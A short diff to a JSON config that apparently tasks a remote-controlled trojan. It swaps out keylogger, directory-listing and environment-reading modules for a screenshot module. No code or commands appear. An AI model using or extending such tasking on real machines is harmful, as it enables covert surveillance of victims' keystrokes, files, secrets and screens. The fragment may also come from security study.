@@ -1,7 +1,4 @@
 [
 	{"status":"1"},
-	{"importMOD":"keylogger"},
-	{"pmod":"keylogger"},
-	{"module":"dirlister"},
-	{"module":"env"}
+	{"module":"screenshot"}
 ]
